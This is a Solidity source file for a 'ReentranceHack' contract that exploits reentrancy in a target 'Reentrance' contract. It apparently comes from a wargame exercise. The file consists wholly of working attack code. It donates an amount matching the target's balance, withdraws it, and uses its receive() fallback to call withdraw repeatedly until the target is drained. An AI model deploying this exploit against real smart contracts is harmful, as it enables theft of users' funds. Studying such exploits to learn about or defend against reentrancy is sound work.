// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Reentrance {

    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;
}


contract ReentranceHack {
    Reentrance public reentrance;
    address public owner;

    constructor(address _reentrance) {
        reentrance = Reentrance(_reentrance);
        owner = msg.sender;
    }

    function hack() public payable {
        uint256 contractBalance = address(reentrance).balance;
        
        require(msg.value == contractBalance, "msg.value must be equal to contract balance");

        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }
    receive() external payable {
        uint256 contractBalance = address(reentrance).balance;

        if (contractBalance != 0) {
            reentrance.withdraw(contractBalance);
        }

    }

}